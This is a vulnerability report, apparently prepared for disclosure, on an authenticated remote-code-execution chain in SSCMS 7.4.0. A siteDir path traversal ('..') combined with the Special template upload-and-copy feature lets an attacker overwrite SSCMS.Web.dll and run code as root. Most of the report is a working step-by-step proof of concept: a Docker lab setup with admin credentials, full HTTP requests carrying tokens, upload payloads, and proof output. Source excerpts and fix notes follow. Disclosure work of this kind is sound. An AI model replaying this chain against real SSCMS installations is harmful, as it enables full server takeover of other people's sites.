### Vulnerability details

**Official website / Product:** https://sscms.com / https://github.com/siteserver/cms

**Repository:** siteserver/cms (stars at selection: 3917)

**Vulnerability type:** RCE / getshell (SiteDir path traversal → Special upload copy into app ContentRoot → overwrite SSCMS.Web.dll)

**Vulnerability versions:** SSCMS 7.4.0 (Docker image `sscms/core:7.4.0`; same `IsDirectoryNameCompliant` / `GetSitePathAsync` fallback logic in tree; audited tip ~`09ab59b` / tag 7.4.0)

**Vulnerability URL / Parameter:**
1. `POST /api/admin/settings/sitesAdd` — JSON field `siteDir` (may contain `..`)
2. `POST /api/admin/cms/templates/templatesSpecial` — `id=0` creates a Special (`url` e.g. `/pwnsp`)
3. `POST /api/admin/cms/templates/templatesSpecial/actions/upload?siteId=<escapedSiteId>&guid=<guid>` — arbitrary filename upload to temp
4. `POST /api/admin/cms/templates/templatesSpecial` — `isUploadOnly=true`, copies temp files into the escaped site root (ContentRoot `/app`)

**Complex:** yes

### Verification procedure

1. Start the lab with the compose below (image `sscms/core:7.4.0`, host port **18910→8080**, SQLite). Complete first-run install; lab admin is **`admin` / `Admin1234`** (login API password field is the **MD5 hex** of the plaintext: `751cb3f4aa17c36186f4856c8982bf27`).

```yaml
services:
  sscms:
    image: sscms/core:7.4.0
    container_name: sscms-r9a10
    ports:
      - "18910:8080"
    environment:
      SSCMS_SECURITY_KEY: "r9a10-audit-key-0123456789abcdef.fedcba9876543210"
      SSCMS_DATABASE_TYPE: SQLite
      ASPNETCORE_URLS: "http://+:8080"
    volumes:
      - sscms_data:/app/wwwroot
    restart: unless-stopped

volumes:
  sscms_data:
```

```bash
docker compose up -d
# container name sscms-r9a10; entry process is dotnet SSCMS.Web.dll
```

2. `POST /api/admin/login` to obtain `token` (Bearer JWT) and `sessionId` (`X-SS-SESSIONID`); write APIs also need `X-CSRF-TOKEN` (from an authenticated GET JSON `csrfToken` or antiforgery cookie).
3. `POST /api/admin/settings/sitesAdd` with `siteDir` = `..` (or `../pwn`, `../../rce_sitedir`). `IsDirectoryNameCompliant` only rejects `Path.GetInvalidPathChars()` and **allows** `..`; after the DB row is created, bare `GetSitePathAsync(site)` resolves outside wwwroot (`..` → `/app`). Note: deep relative values such as `../../rce_sitedir` may return HTTP 500 during post-insert site setup while **still persisting SiteDir**; the primary verified path uses EscapeSite (`siteId=2`, `SiteDir=..`).
4. On that escaped site, `POST /api/admin/cms/templates/templatesSpecial` with `id=0` to create a Special (e.g. `title=PwnSpecial`, `url=/pwnsp`); record returned `id`/`guid`.
5. `POST .../templatesSpecial/actions/upload?siteId=2&guid=<guid>` multipart-upload a file (marker or replacement `SSCMS.Web.dll`); response `{"value":"<filename>"}`.
6. `POST templatesSpecial` with `isUploadOnly=true` and `fileNames` containing that filename: `GetSpecialDirectoryPathAsync` → `GetSitePathAsync(site, urlSegments)` falls back to bare escaped `sitePath=/app` when the combined path leaves wwwroot; `IsInDirectory(/app,/app)` passes; `DirectoryUtils.Copy` merges `_src` into `/app`.
7. After overwriting `/app/SSCMS.Web.dll`, `docker compose restart`; attacker code runs as root and writes `/tmp/RCE_PROOF.txt`.

### Complete vulnerability PoC

**(A) Login** (password is MD5 hex; if response has `isLoginExists=true`, replay with `isForceLogoutAndLogin` / `forceLoginTicket`):

```http
POST /api/admin/login HTTP/1.1
Host: 127.0.0.1:18910
Content-Type: application/json
Connection: close

{"account":"admin","password":"751cb3f4aa17c36186f4856c8982bf27","isPersistent":true,"isForceLogoutAndLogin":false}
```

After login, take `token` and `sessionId`; then call any authenticated admin GET (e.g. `GET /api/admin/cms/templates/templatesSpecial?siteId=1`) and read `csrfToken` from the JSON. Subsequent writes need `Authorization` / `X-SS-SESSIONID` / `X-CSRF-TOKEN`.

**(B) Create escaped site** (primary path `siteDir=..`; success returns a new `siteId`. Body matches the `../../rce_sitedir` request shape below with `siteName`/`siteDir`/`guid` changed):

```http
POST /api/admin/settings/sitesAdd HTTP/1.1
Host: 127.0.0.1:18910
Authorization: Bearer <token>
X-SS-SESSIONID: <sessionId>
X-CSRF-TOKEN: <csrfToken>
Content-Type: application/json
Connection: close

{"guid":"evidence-escape-1","createType":"empty","siteName":"EscapeSite","root":false,"parentId":0,"siteDir":"..","tableRule":"Choose","tableChoose":"siteserver_20261101_1","tableHandWrite":"","isImportContents":false,"isImportTableStyles":false,"localDirectoryName":"","cloudThemeUserName":"","cloudThemeName":"","isCloudThemeFree":false}
```

Lab site inventory already includes EscapeSite (plus other traversal `siteDir` values); later steps use EscapeSite. Condensed excerpt:

```json
{
  "sites": [
    {"id": 1, "siteName": "RootSite", "siteDir": "", "siteUrl": "/", "root": true},
    {"id": 2, "siteName": "EscapeSite", "siteDir": "..", "siteUrl": "/..", "root": false, "tableName": "siteserver_20261101_2", "guid": "0a2cd38a-b5c8-4d58-872b-4b84735e5a89"},
    {"id": 3, "siteName": "T_dd_pwn", "siteDir": "../pwn", "siteUrl": "/../pwn", "root": false},
    {"id": 6, "siteName": "T_site_dd_dd_pwn", "siteDir": "site/../../pwn", "siteUrl": "/site/../../pwn", "root": false},
    {"id": 8, "siteName": "NormalChild", "siteDir": "normalchild", "siteUrl": "/normalchild", "root": false}
  ],
  "rootSiteId": 1
}
```

Deep relative-path request also captured (HTTP 500; this inventory snapshot has no `RceSiteDir` / `../../rce_sitedir` row — primary path remains EscapeSite):

```http
POST /api/admin/settings/sitesAdd HTTP/1.1
Host: 127.0.0.1:18910
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIxIiwidW5pcXVlX25hbWUiOiJhZG1pbiIsInJvbGUiOiJBZG1pbmlzdHJhdG9yIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9pc3BlcnNpc3RlbnQiOiJUcnVlIiwibmJmIjoxNzkzNTM4MTYxLCJleHAiOjE3OTQxNDI5NjEsImlhdCI6MTc5MzUzODE2MX0.1lwOf3c2KqaGPkirW9grAt5Z6jJ_17XBQybSgLzqHjQ
X-SS-SESSIONID: f10bc539-3cfa-4630-b207-b0fdc97f2920
X-CSRF-TOKEN: CfDJ8HUsVHVR8AtGuPfoU_26Km8FpKpvdgM9R78nM1H0KsvhVbo0TyInNvP-aqVsCCKecDFyzje4h1AcjkV0XyWB41hH0XqGUh4iAF9_rQzLc_1p8EXvBdSwqJaaEZYkFlXjvnst2uGvVBVkStYuJq9YqJBtIkflEVX0LOXVGgKDwwymFkakX6FP8LUpova9kkm4xg
Content-Type: application/json
Content-Length: 354
Connection: close

{"guid":"evidence-create-1","createType":"empty","siteName":"RceSiteDir","root":false,"parentId":0,"siteDir":"../../rce_sitedir","tableRule":"Choose","tableChoose":"siteserver_20261101_1","tableHandWrite":"","isImportContents":false,"isImportTableStyles":false,"localDirectoryName":"","cloudThemeUserName":"","cloudThemeName":"","isCloudThemeFree":false}
```

```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Connection: close

{
  "message": "系统异常，请稍后重试或联系管理员",
  "errorId": 14,
  "createdDate": "2026-11-01 13:02:59"
}
```

**(B2) Create Special** (`id=0`; record returned Special `id`; `guid` is a client-generated temp upload folder name reused by upload / isUploadOnly):

```http
POST /api/admin/cms/templates/templatesSpecial HTTP/1.1
Host: 127.0.0.1:18910
Authorization: Bearer <token>
X-SS-SESSIONID: <sessionId>
X-CSRF-TOKEN: <csrfToken>
Content-Type: application/json
Connection: close

{"siteId":2,"id":0,"title":"PwnSpecial","url":"/pwnsp","guid":"4bfa6f84-3a87-4a53-b817-e0f2f4049d63","fileNames":[],"isEditOnly":false,"isUploadOnly":false}
```

**(C) Special temp upload** (Docker-verified response; multipart `file` named `http_evidence_marker.txt`, body `HTTP_EVIDENCE_MARKER_R9A10`):
```http
POST /api/admin/cms/templates/templatesSpecial/actions/upload?siteId=2&guid=4bfa6f84-3a87-4a53-b817-e0f2f4049d63 HTTP/1.1
Host: 127.0.0.1:18910
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIxIiwidW5pcXVlX25hbWUiOiJhZG1pbiIsInJvbGUiOiJBZG1pbmlzdHJhdG9yIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9pc3BlcnNpc3RlbnQiOiJUcnVlIiwibmJmIjoxNzkzNTM4MTYxLCJleHAiOjE3OTQxNDI5NjEsImlhdCI6MTc5MzUzODE2MX0.1lwOf3c2KqaGPkirW9grAt5Z6jJ_17XBQybSgLzqHjQ
X-SS-SESSIONID: f10bc539-3cfa-4630-b207-b0fdc97f2920
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySscmsR9a10
Connection: close

------WebKitFormBoundarySscmsR9a10
Content-Disposition: form-data; name="file"; filename="http_evidence_marker.txt"
Content-Type: text/plain

HTTP_EVIDENCE_MARKER_R9A10
------WebKitFormBoundarySscmsR9a10--
```

```http
HTTP/1.1 200 OK
Content-Length: 36
Content-Type: application/json; charset=utf-8
Date: Sun, 01 Nov 2026 13:02:41 GMT
X-Content-Type-Options: nosniff

{"value":"http_evidence_marker.txt"}
```

**(D) isUploadOnly copy into escaped site root (app ContentRoot)** — full Docker-lab request/response:

```http
POST /api/admin/cms/templates/templatesSpecial HTTP/1.1
Host: 127.0.0.1:18910
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIxIiwidW5pcXVlX25hbWUiOiJhZG1pbiIsInJvbGUiOiJBZG1pbmlzdHJhdG9yIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9pc3BlcnNpc3RlbnQiOiJUcnVlIiwibmJmIjoxNzkzNTM4MTYxLCJleHAiOjE3OTQxNDI5NjEsImlhdCI6MTc5MzUzODE2MX0.1lwOf3c2KqaGPkirW9grAt5Z6jJ_17XBQybSgLzqHjQ
X-SS-SESSIONID: f10bc539-3cfa-4630-b207-b0fdc97f2920
X-CSRF-TOKEN: CfDJ8HUsVHVR8AtGuPfoU_26Km_Ref54IfXufir3UKmp8qVhzpd5SUm7S5mEDLqI5LzTCPnMqnXX_yDYVEekznoJpsYu2GGi9IA5yz2XpK1Efm5rW7DpkxC9dATcsj9Z9nJKeFvExXM8nacF80D-tDwjqfK1Leyt0ZM-t6UWfmHnDqRznO51Y18snWqkbxMzJmW7cg
Content-Type: application/json
Content-Length: 181
Connection: close

{"siteId":2,"id":1,"title":"PwnSpecial","url":"/pwnsp","guid":"4bfa6f84-3a87-4a53-b817-e0f2f4049d63","fileNames":["http_evidence_marker.txt"],"isEditOnly":false,"isUploadOnly":true}
```

```http
HTTP/1.1 200 OK
Content-Length: 242
Connection: close
Content-Type: application/json; charset=utf-8
Date: Sun, 01 Nov 2026 13:02:41 GMT
X-Content-Type-Options: nosniff

{"specials":[{"editable":false,"siteId":2,"title":"PwnSpecial","url":"/pwnsp","addDate":"2026-11-01 12:55:38","id":1,"guid":"d96dd119-f7c0-43b8-a121-8d307a84566b","createdDate":"2026-11-01 12:55:38","lastModifiedDate":"2026-11-01 12:55:38"}]}
```

Verification result notes:

- The `isUploadOnly` request returns HTTP 200; container has `/app/http_evidence_marker.txt` with body `HTTP_EVIDENCE_MARKER_R9A10`.
- Using the same chain to upload and overwrite `/app/SSCMS.Web.dll` (filename must be `SSCMS.Web.dll`, copied into `/app` via upload → `isUploadOnly`) then `docker compose restart`, the process loads attacker code as root and writes `/tmp/RCE_PROOF.txt`. The malicious DLL is a binary payload: build a .NET entry assembly (compatible with the image runtime) whose startup path writes that proof file, then upload it via steps (C)/(D) under that filename. Observed impact line:

```text
RCE_OK user=root uid_machine=c5e461aa768e time=2026-11-01T13:00:56.2737824Z
```

- Site inventory confirms `SiteDir=..` (EscapeSite id=2, `siteUrl=/..`); the same list also has `../pwn`, `site/../../pwn`, etc. The `siteDir=../../rce_sitedir` create request is the HTTP 500 sample above.

In-container checks (compose container name `sscms-r9a10`):

```bash
docker exec sscms-r9a10 cat /app/http_evidence_marker.txt
# expected:
# HTTP_EVIDENCE_MARKER_R9A10

docker exec sscms-r9a10 cat /tmp/RCE_PROOF.txt
# expected:
# RCE_OK user=root uid_machine=c5e461aa768e time=2026-11-01T13:00:56.2737824Z
```

### Vulnerability analysis

`DirectoryUtils.IsDirectoryNameCompliant` only checks `Path.GetInvalidPathChars()` and **allows** `..`. `SitesAddController.Submit` invokes that check when `!root`, then persists `SiteDir`. Bare `GetSitePathAsync(site)` does `Path.Combine(WebRootPath, SiteDir)` **without** `IsInDirectory`, so the site root can become ContentRoot (`/app`).

On Special submit, `GetSpecialDirectoryPathAsync` → `ParseSitePathAsync` → `GetSitePathAsync(site, urlSegments)` returns the escaped bare `sitePath` when the combined path leaves wwwroot. The “must stay inside site directory” check then uses `/app` as the parent and succeeds for `directoryPath=/app`. `DirectoryUtils.Copy(_src, /app)` is arbitrary write to the application root, including `SSCMS.Web.dll`; restart loads the attacker assembly → getshell/RCE.

Trigger / sink source (full path and line numbers):

```csharp
# File: src/SSCMS/Utils/DirectoryUtils.cs
# Lines: ~96-100 (IsDirectoryNameCompliant)
public static bool IsDirectoryNameCompliant(string directoryName)
{
    if (string.IsNullOrEmpty(directoryName)) return false;
    return -1 == directoryName.IndexOfAny(PathUtils.InvalidPathChars);
}
```

```csharp
# File: src/SSCMS.Core/Services/PathManager.Site.cs
# Lines: ~668-700 (GetSitePathAsync)
public async Task<string> GetSitePathAsync(Site site, params string[] paths)
{
    if (site == null)
    {
        return GetRootPath(paths);
    }

    string sitePath;
    if (site.ParentId == 0)
    {
        sitePath = PathUtils.Combine(_settingsManager.WebRootPath, site.Root ? string.Empty : site.SiteDir);
    }
    else
    {
        var parent = await _siteRepository.GetAsync(site.ParentId);
        sitePath = await GetSitePathAsync(parent, site.SiteDir);
    }

    if (paths == null || paths.Length <= 0) return sitePath; // no IsInDirectory

    var returnPath = sitePath;
    foreach (var t in paths)
    {
        var path = t?.Replace(PageUtils.SeparatorChar, PathUtils.SeparatorChar).Trim(PathUtils.SeparatorChar) ?? string.Empty;
        returnPath = PathUtils.Combine(returnPath, path);
    }

    if (DirectoryUtils.IsInDirectory(_settingsManager.WebRootPath, returnPath))
    {
        return returnPath;
    }

    return sitePath; // fallback to already-escaped sitePath
}
```

```csharp
# File: src/SSCMS.Core/Services/PathManager.Special.cs
# GetSpecialDirectoryPathAsync
public async Task<string> GetSpecialDirectoryPathAsync(Site site, string url)
{
    var virtualPath = PageUtils.RemoveFileNameFromUrl(url);
    virtualPath = PathUtils.RemoveParentPath(virtualPath);
    return await ParseSitePathAsync(site, virtualPath);
}
```

```csharp
# File: src/SSCMS.Web/Controllers/Admin/Cms/Templates/TemplatesSpecialController.Submit.cs
# Lines: ~69-98 (isUploadOnly branch)
else if (specialId > 0 && request.IsUploadOnly)
{
    var specialInfo = await _specialRepository.GetSpecialAsync(request.SiteId, specialId);

    var directoryPath = await _pathManager.GetSpecialDirectoryPathAsync(site, specialInfo.Url);
    if (!DirectoryUtils.IsInDirectory(siteDirectoryPath, directoryPath))
    {
        return this.Error("专题访问地址必须在站点访问地址内部！");
    }

    var srcDirectoryPath = _pathManager.GetSpecialSrcDirectoryPath(directoryPath);
    DirectoryUtils.CreateDirectoryIfNotExists(srcDirectoryPath);

    var uploadDirectoryPath = _pathManager.GetTemporaryFilesPath(request.Guid);
    foreach (var filePath in DirectoryUtils.GetFilePaths(uploadDirectoryPath))
    {
        var fileName = PathUtils.GetFileName(filePath);
        if (!ListUtils.ContainsIgnoreCase(request.FileNames, fileName)) continue;
        // zip extract or MoveFile → /app/_src/...
        FileUtils.MoveFile(filePath, PathUtils.Combine(srcDirectoryPath, fileName), true);
    }

    DirectoryUtils.Copy(srcDirectoryPath, directoryPath); // directoryPath may be /app
}
```

### Fix notes

1. Reject `.`, `..`, separators, and absolute paths in `IsDirectoryNameCompliant`.
2. Always enforce `IsInDirectory(WebRootPath, resolved)` in `GetSitePathAsync`; error instead of falling back to an escaped path.
3. Bound Special/upload/template writes to a canonicalized site document root; never treat ContentRoot as a site docroot.
